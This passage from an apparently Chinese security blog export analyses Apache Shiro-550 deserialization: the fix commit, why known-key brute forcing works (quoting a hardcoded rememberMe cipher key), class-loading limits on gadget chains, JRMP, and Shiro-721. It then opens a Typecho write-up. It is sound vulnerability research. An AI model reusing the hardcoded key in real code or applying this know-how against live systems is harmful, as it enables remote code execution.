class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4EE5;&#x4E0B;&#x662F;&#x51E0;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#x622A;&#x56FE;&#xFF1A;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012419243.png" alt="image-20201216012419243"></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012229514.png" alt="image-20201216012229514"></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011528037.png" alt="image-20201216011528037"></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011918348.png" alt="image-20201216011918348"></p>
<h1 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;"><a href="#&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;"></a>&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h1><p><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p>
<p>&#x786C;&#x7F16;&#x7801;  -&gt;  &#x968F;&#x673A;&#x503C;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205223500139.png" alt="image-20201205223500139"></p>
<h1 id="&#x5229;&#x7528;&#x9650;&#x5236;&#x3001;&#x5751;&#x70B9;&#x53CA;&#x601D;&#x8003;"><a href="#&#x5229;&#x7528;&#x9650;&#x5236;&#x3001;&#x5751;&#x70B9;&#x53CA;&#x601D;&#x8003;" class="headerlink" title="&#x5229;&#x7528;&#x9650;&#x5236;&#x3001;&#x5751;&#x70B9;&#x53CA;&#x601D;&#x8003;"></a>&#x5229;&#x7528;&#x9650;&#x5236;&#x3001;&#x5751;&#x70B9;&#x53CA;&#x601D;&#x8003;</h1><h2 id="&#x4E3A;&#x4EC0;&#x4E48;-100key-&#x80FD;&#x7528;"><a href="#&#x4E3A;&#x4EC0;&#x4E48;-100key-&#x80FD;&#x7528;" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48; 100key &#x80FD;&#x7528;"></a>&#x4E3A;&#x4EC0;&#x4E48; 100key &#x80FD;&#x7528;</h2><p>&#x5404;&#x79CD; shiro exploit &#x4F3C;&#x4E4E;&#x90FD;&#x5728;&#x96C6;&#x6210;&#x4E00;&#x4E2A;&#x7206;&#x7834; key &#x7684;&#x529F;&#x80FD;&#x3002;&#x4F46;&#x662F;&#x6839;&#x636E;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x770B;&#x51FA; 1.2.4 &#x7684; key &#x662F;&#x786C;&#x7F16;&#x7801;&#x7684;&#xFF0C;&#x7136;&#x540E; 1.2.5 &#x4E4B;&#x540E;&#x53D8;&#x6210;&#x4E86;&#x968F;&#x673A;&#x503C;&#x3002;key &#x503C;&#x7206;&#x7834;&#x4F3C;&#x4E4E;&#x8DDF;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x5173;&#x7CFB;&#x3002;</p>
<p>&#x5BF9; shiro &#x7684;&#x4E86;&#x89E3;&#x548C;&#x7814;&#x7A76;&#x5E76;&#x4E0D;&#x6DF1;&#x523B;&#xFF0C;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7B54;&#x6848;&#x6765;&#x6E90;&#x4E8E;&#xFF1A;<a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw" target="_blank" rel="noopener">&#x5173;&#x4E8E;Shiro&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x5EF6;&#x4F38;&#x2014;&#x5347;&#x7EA7;shiro&#x4E5F;&#x80FD;&#x88AB;shell</a></p>
<blockquote>
<p>&#x53EF;&#x80FD;&#x6027;1&#xFF1A;&#x6709;&#x5176;&#x4ED6;&#x5F00;&#x6E90;&#x6846;&#x67B6;&#x6574;&#x5408;&#x4E86;shiro&#xFF0C;&#x5E76;&#x4E14;&#x6709;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5927;&#x5BB6;&#x5C31;&#x90FD;&#x76F4;&#x63A5;&#x7528;&#x4E86;&#x3002;</p>
<p>&#x53EF;&#x80FD;&#x6027;2&#xFF1A;&#x56E0;&#x4E3A;&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x90FD;&#x662F;&#x4E92;&#x76F8;&#x6284;&#x6765;&#x6284;&#x53BB;&#x7684;&#xFF0C;&#x5728;&#x535A;&#x5BA2;&#x91CC;&#xFF0C;&#x6559;&#x7A0B;&#x91CC;&#xFF0C;github&#x91CC;&#x6709;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#xFF0C;&#x5F00;&#x53D1;&#x76F4;&#x63A5;&#x62FF;&#x8FC7;&#x6765;&#x7528;&#x3002;</p>
</blockquote>
<p>Forexampe: ShiroConfig</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * cookie&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> CookieRememberMeManager <span class="hljs-title">rememberMeManager</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  CookieRememberMeManager cookieRememberMeManager = <span class="hljs-keyword">new</span> CookieRememberMeManager();</span><br><span class="line">  cookieRememberMeManager.setCookie(rememberMeCookie());</span><br><span class="line">  <span class="hljs-comment">// rememberMe cookie&#x52A0;&#x5BC6;&#x7684;&#x5BC6;&#x94A5;</span></span><br><span class="line">  cookieRememberMeManager.setCipherKey(Base64.decode(<span class="hljs-string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> cookieRememberMeManager;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="&#x4E3A;&#x4EC0;&#x4E48;&#x6709;&#x7684;&#x94FE;&#x6253;&#x4E0D;&#x4E86;"><a href="#&#x4E3A;&#x4EC0;&#x4E48;&#x6709;&#x7684;&#x94FE;&#x6253;&#x4E0D;&#x4E86;" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48;&#x6709;&#x7684;&#x94FE;&#x6253;&#x4E0D;&#x4E86;"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x6709;&#x7684;&#x94FE;&#x6253;&#x4E0D;&#x4E86;</h2><p>&#x8FD9;&#x4E2A;&#x5728;&#x8EAB;&#x8FB9;&#x7684; @p1g3 &#x548C; @l3yx &#x7684;&#x535A;&#x5BA2;&#x4E2D;&#x90FD;&#x9610;&#x8FF0;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#x4E86;&#x3002;</p>
<p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#x5C31;&#x662F; <code>org.apache.shiro.io.DefaultSerializer#deserialize</code> &#x4E2D;&#x8C03;&#x7528; &#x7684; <code>ClassResolvingObjectInputStream</code> &#x91CD;&#x5199;&#x4E86; <code>resolveClass</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> SerializationException </span>{</span><br><span class="line">  <span class="hljs-keyword">if</span> (serialized == <span class="hljs-keyword">null</span>) {</span><br><span class="line">    String msg = <span class="hljs-string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">    BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(bais);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span> {</span><br><span class="line">      ObjectInputStream ois = <span class="hljs-keyword">new</span> ClassResolvingObjectInputStream(bis);</span><br><span class="line">      T deserialized = ois.readObject();</span><br><span class="line">      ois.close();</span><br><span class="line">      <span class="hljs-keyword">return</span> deserialized;</span><br><span class="line">    } <span class="hljs-keyword">catch</span> (Exception var6) {</span><br><span class="line">      String msg = <span class="hljs-string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>org.apache.shiro.io.ClassResolvingObjectInputStream</code> &#x662F;&#x600E;&#x4E48;&#x5199;&#x7684;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="hljs-comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">package</span> org.apache.shiro.io;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.shiro.util.ClassUtils;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.shiro.util.UnknownClassException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassResolvingObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ClassResolvingObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        <span class="hljs-keyword">super</span>(inputStream);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            <span class="hljs-keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (UnknownClassException var3) {</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassNotFoundException(<span class="hljs-string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="hljs-string">&quot;]: &quot;</span>, var3);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Compare to <code>java.io.ObjectInputStream#resolveClass</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> Class&lt;?&gt; resolveClass(ObjectStreamClass objectStreamClass) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">    String name = objectStreamClass.getName();</span><br><span class="line">    <span class="hljs-keyword">try</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> Class.forName(name, <span class="hljs-keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    } <span class="hljs-keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">        ClassNotFoundException classNotFoundException = e;</span><br><span class="line">        Class&lt;?&gt; cls = primClasses.get(name);</span><br><span class="line">        <span class="hljs-keyword">if</span> (cls != <span class="hljs-keyword">null</span>) {</span><br><span class="line">            <span class="hljs-keyword">return</span> cls;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">throw</span> classNotFoundException;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Shiro &#x4E2D;&#x4F7F;&#x7528;&#x4E86; <code>ClassUtils.forName</code> &#x800C;&#x539F;&#x751F;&#x7684;&#x4F7F;&#x7528;&#x7684; <code>Class.forName</code></p>
<p>&#x5177;&#x4F53;&#x533A;&#x522B;&#x8DDF;&#x8FDB;  <code>ClassUtils.forName</code> </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title">forName</span><span class="hljs-params">(String fqcn)</span> <span class="hljs-keyword">throws</span> UnknownClassException </span>{</span><br><span class="line">  Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (log.isTraceEnabled()) {</span><br><span class="line">      log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (log.isTraceEnabled()) {</span><br><span class="line">      log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the current ClassLoader.  &quot;</span> + <span class="hljs-string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) {</span><br><span class="line">    String msg = <span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the thread context, current, or &quot;</span> + <span class="hljs-string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnknownClassException(msg);</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-keyword">return</span> clazz;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x76F4;&#x89C2;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x7684;&#x662F;&#x91CC;&#x9762;&#x5927;&#x591A;&#x91C7;&#x7528;&#x4E86; <code>loadClass</code> &#x6765;&#x52A0;&#x8F7D;&#x3002;&#x81F3;&#x4E8E;&#x4F7F;&#x7528;&#x5176;&#x52A0;&#x8F7D;&#x7C7B;&#x6709;&#x4EC0;&#x4E48;&#x5F0A;&#x7AEF;&#x53EF;&#x4EE5;&#x770B; @p1g3 &#x8FD9;&#x6BB5;&#x8BDD;</p>
<blockquote>
<p>ClassLoader.loadClass&#x7684;&#x65B9;&#x5F0F;&#x5E76;&#x4E0D;&#x652F;&#x6301;&#x52A0;&#x8F7D;&#x6570;&#x7EC4;&#x7C7B;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;cc&#x6CA1;&#x6CD5;&#x7528;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x5F53;&#x7136;&#x8FD9;&#x90E8;&#x5206;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x6DF1;&#x5165;&#x5206;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x5176;&#x6D89;&#x53CA;&#x5230;&#x4E86;Java&#x4E2D;&#x4E00;&#x79CD;&#x53EB;&#x201D;&#x53CC;&#x4EB2;&#x59D4;&#x6D3E;&#x201D;&#x7684;&#x7C7B;&#x52A0;&#x8F7D;&#x601D;&#x8DEF; &amp; &#x7A81;&#x7834;&#x201D;&#x53CC;&#x4EB2;&#x59D4;&#x6D3E;&#x201D;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x548C;&#x6F0F;&#x6D1E;&#x65E0;&#x5173;</p>
<p>&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x5219;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x5E26;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;&#x7684;gadget&#xFF0C;&#x800C;cc3.2.1&#x4E2D;&#x7684;&#x6240;&#x6709;&#x94FE;&#xFF08;&#x5728;&#x5B98;&#x65B9;&#x4ED3;&#x5E93;&#x5185;&#x7684;&#xFF09;&#x90FD;&#x9700;&#x8981;&#x7528;&#x5230;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;transformer&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x6784;&#x9020;&#x94FE;&#xFF0C;&#x7528;&#x5176;&#x4ED6;&#x94FE;&#x6765;&#x6253;&#x3002;</p>
</blockquote>
<p>&#x5927;&#x6982;&#x5C0F;&#x7ED3;&#xFF1A;</p>
<blockquote>
<p>Shiro resovleClass&#x4F7F;&#x7528;&#x7684;&#x662F;ClassLoader.loadClass()&#x800C;&#x975E;Class.forName()&#xFF0C;&#x800C;ClassLoader.loadClass&#x4E0D;&#x652F;&#x6301;&#x88C5;&#x8F7D;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#x7684;class&#x3002;</p>
</blockquote>
<p>&#x81F3;&#x4E8E; <code>ClassLoader.loadClass</code> &#x662F;&#x4E0D;&#x662F;&#x6240;&#x6709; class &#x90FD;&#x65E0;&#x6CD5;&#x52A0;&#x8F7D;&#xFF1F;</p>
<p>&#x53C2;&#x8003;&#x4E0B;&#x4E00;&#x5C0F;&#x6807;&#x9898;</p>
<h2 id="&#x5EF6;&#x4F38;-resovleClass-&#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x52A0;&#x8F7D;"><a href="#&#x5EF6;&#x4F38;-resovleClass-&#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x52A0;&#x8F7D;" class="headerlink" title="&#x5EF6;&#x4F38; - resovleClass &#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x52A0;&#x8F7D;"></a>&#x5EF6;&#x4F38; - resovleClass &#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x52A0;&#x8F7D;</h2><p>&#x5728; P&#x725B;&#x5708;&#x5B50;&#x4E2D;&#x6709;&#x4E2A;&#x5E08;&#x5085;&#x6587;&#x7AE0; &#x770B;&#x5230;&#x4E86;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E0A;&#x4E00;&#x4E2A;&#x5C0F;&#x6807;&#x9898;&#x4E2D;&#x603B;&#x7ED3;&#x7684; <code>ClassLoader.loadClass</code>&#x4E0D;&#x652F;&#x6301;&#x88C5;&#x8F7D;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#x7684;class &#x6709;&#x4E86;&#x5168;&#x65B0;&#x7684;&#x770B;&#x6CD5;&#x3002;</p>
<p><code>[Ljava.lang.StackTraceElement</code>  &#x6570;&#x7EC4;&#x7C7B;&#x52A0;&#x8F7D;</p>
<p>&#x5148;&#x7559;&#x4E2A;&#x5751;&#xFF0C;CC&#x8C03;&#x5B8C;&#x56DE;&#x6765;&#x5199;</p>
<h2 id="JRMP-&#x653B;&#x51FB;"><a href="#JRMP-&#x653B;&#x51FB;" class="headerlink" title="JRMP &#x653B;&#x51FB;"></a>JRMP &#x653B;&#x51FB;</h2><ul>
<li>&#x4F18;&#x70B9;<ul>
<li>&#x4E0D;&#x9700;&#x8981;&#x4F9D;&#x8D56;</li>
</ul>
</li>
<li>&#x7F3A;&#x70B9;<ul>
<li>JEP290&#xFF08;&#x53D7;&#x9650; JDK &#x7248;&#x672C;&#xFF09;:    <a href="https://paper.seebug.org/454/" target="_blank" rel="noopener">https://paper.seebug.org/454/</a></li>
<li>&#x9700;&#x8981;&#x51FA;&#x7F51;</li>
</ul>
</li>
</ul>
<h2 id="&#x5206;&#x6790;&#x601D;&#x8003;"><a href="#&#x5206;&#x6790;&#x601D;&#x8003;" class="headerlink" title="&#x5206;&#x6790;&#x601D;&#x8003;"></a>&#x5206;&#x6790;&#x601D;&#x8003;</h2><p>&#x5306;&#x5306;&#x5206;&#x6790;&#x5B8C;&#x4E86; Shiro550&#x3002;&#x9664;&#x4E86;&#x52A0;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x8DDF; POC &#x7684;&#x7F16;&#x5199;&#x5916;&#x4F3C;&#x4E4E;&#x5E76;&#x6CA1;&#x6709;&#x5206;&#x6790;&#x592A;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x7531;&#x4E8E;&#x5BF9; AES &#x7684;&#x7406;&#x89E3;&#x4E0D;&#x8DB3;&#x76F4;&#x63A5;&#x5728;&#x52A0;&#x89E3;&#x5BC6;&#x8FC7;&#x7A0B;&#x4E2D;&#x76F4;&#x63A5;&#x5FFD;&#x7565;&#x4E86; AES &#x7684;&#x5177;&#x4F53;&#x6B65;&#x9AA4;&#x3002;&#x611F;&#x89C9;&#x8FD9;&#x6837;&#x6D45;&#x5C1D;&#x8F84;&#x6B62;&#x7684;&#x5206;&#x6790;&#x4E0D;&#x662F;&#x592A;&#x597D;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x4E0B;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x7684;&#x65F6;&#x5019;&#x8981;&#x5177;&#x4F53;&#x7EC6;&#x5316;&#x4E00;&#x4E0B;&#x3002;</p>
<p>&#x524D;&#x6587;&#x4E2D;&#x63D0;&#x5230;&#x4E86; <code>resovleClass</code> &#x5BF9; Shiro &#x5229;&#x7528;&#x94FE;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x90A3;&#x4E48;&#x4EC0;&#x4E48;&#x94FE;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x8BE5;&#x5982;&#x4F55;&#x53BB;&#x6784;&#x9020;&#x65B0;&#x7684;&#x94FE;&#xFF0C;&#x662F;&#x6211;&#x4EEC;&#x503C;&#x5F97;&#x6DF1;&#x601D;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5148;&#x7559;&#x4E2A;&#x5751;&#xFF0C;&#x51C6;&#x5907;&#x53BB;&#x7406;&#x4E00;&#x4E0B; CommonsCollections gadget chain</p>
<h2 id="Shiro-721-PaddingOracle-CBC-Attack"><a href="#Shiro-721-PaddingOracle-CBC-Attack" class="headerlink" title="Shiro-721 PaddingOracle CBC Attack"></a>Shiro-721 PaddingOracle CBC Attack</h2><p>Shiro-721 PaddingOracle CBC Attack</p>
<p>&#x4E2A;&#x4EBA;&#x603B;&#x7ED3;&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;</p>
<ol>
<li>rememberMe &#x52A0;&#x89E3;&#x5BC6;&#x539F;&#x7406;</li>
<li>Shiro 1.4.1&#x53CA;&#x5176;&#x4E4B;&#x524D;&#x7248;&#x672C;&#x7684;Cookie&#x4E2D;&#x7684;rememberMe&#x5B57;&#x6BB5;&#x662F;&#x4F7F;&#x7528;AES-128-CBC&#x6A21;&#x5F0F;&#x6765;&#x52A0;&#x5BC6;&#x751F;&#x6210;&#x7684;</li>
</ol>
<p>&#x9650;&#x5236;&#xFF1A;</p>
<ol>
<li>Apache Shiro &lt;= 1.4.1</li>
<li>&#x9700;&#x8981;&#x6709;&#x6B63;&#x5E38;&#x7528;&#x6237;&#x767B;&#x5F55;&#x7684; Cookie rememberMe</li>
</ol>
<p>&#x6D89;&#x53CA;&#x5230;&#x5BC6;&#x7801;&#x7B97;&#x6CD5;&#xFF0C;&#x4E14;&#x5B9E;&#x9645;&#x5229;&#x7528;&#x6709;&#x9650;&#x3002;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x5206;&#x6790;&#x8303;&#x56F4;</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://l3yx.github.io/" target="_blank" rel="noopener">https://l3yx.github.io/</a></p>
<p><a href="https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B" target="_blank" rel="noopener">https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>
<p><a href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/</a></p>
</body></html>]]></content>
      <categories>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Java</tag>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho 反序列化漏洞分析</title>
    <url>/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>Typecho &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x548C;&#x4E00;&#x4E9B;&#x5751;&#x70B9;</p>
<a id="more"></a>

<h2 id="&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;"><a href="#&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;"></a>&#x6F0F;&#x6D1E;&#x6982;&#x8FF0;</h2><blockquote>
<p>Typecho&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#xFF0C;&#x8F7B;&#x5DE7;&#x7684;&#x535A;&#x5BA2;&#x7A0B;&#x5E8F;&#x3002;&#x57FA;&#x4E8E;PHP&#xFF0C;&#x4F7F;&#x7528;&#x591A;&#x79CD;&#x6570;&#x636E;&#x5E93;&#xFF08;Mysql&#xFF0C;PostgreSQL&#xFF0C;SQLite&#xFF09;&#x50A8;&#x5B58;&#x6570;&#x636E;&#x3002;&#x5728;GPL Version 2&#x8BB8;&#x53EF;&#x8BC1;&#x4E0B;&#x53D1;&#x884C;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x76EE;&#x524D;&#x4F7F;&#x7528;SVN&#x6765;&#x505A;&#x7248;&#x672C;&#x7BA1;&#x7406;&#x3002;</p>
</blockquote>
<p>&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>./install.php</code> &#x3002;&#x662F;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BFC;&#x81F4;&#x7684;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x524D;&#x53F0; getshell&#x3002;</p>
<p>&#x53D7;&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;GitHub&#x4E0A;2017&#x5E74;10&#x6708;24&#x65E5;&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x7248;&#x672C;&#x3002;</p>
